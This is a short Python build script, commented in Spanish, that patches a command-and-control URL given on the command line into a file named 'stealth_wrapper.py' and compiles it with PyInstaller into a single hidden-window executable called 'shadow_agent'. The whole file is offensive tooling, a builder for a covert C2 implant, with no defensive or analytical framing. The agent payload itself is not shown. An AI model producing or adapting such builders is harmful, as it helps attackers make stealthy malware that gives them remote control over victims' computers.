#!/usr/bin/env python3
# build_agent.py - Compila el agente con C2 embebido

import os
import sys
import subprocess
import tempfile
import shutil

WRAPPER_SOURCE = "stealth_wrapper.py"
OUTPUT_NAME = "shadow_agent"

def embed_c2_url(c2_url):
    with open(WRAPPER_SOURCE, "r", encoding="utf-8") as f:
        original_code = f.read()

    # Reemplazamos la línea original de C2_SERVER_URL
    patched_code = ""
    for line in original_code.splitlines():
        if line.strip().startswith("C2_SERVER_URL ="):
            patched_code += f'C2_SERVER_URL = "{c2_url}"\n'
        else:
            patched_code += line + "\n"

    return patched_code

def compile_agent(c2_url):
    print(f"[+] Embebiendo C2 URL: {c2_url}")
    
    temp_dir = tempfile.mkdtemp()
    temp_wrapper_path = os.path.join(temp_dir, "patched_wrapper.py")

    # Patch code with C2 URL
    patched_code = embed_c2_url(c2_url)
    with open(temp_wrapper_path, "w", encoding="utf-8") as f:
        f.write(patched_code)

    print("[+] Compilando con PyInstaller...")
    try:
        subprocess.run([
            "pyinstaller", temp_wrapper_path,
            "--onefile", "--noconsole",
            "--name", OUTPUT_NAME
        ], check=True)
        print("[✔] Agente compilado correctamente.")
    except subprocess.CalledProcessError:
        print("[!] Error durante la compilación.")
    finally:
        shutil.rmtree(temp_dir)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: python {sys.argv[0]} http://C2_IP:PUERTO")
        sys.exit(1)
    
    c2_url = sys.argv[1]
    compile_agent(c2_url)
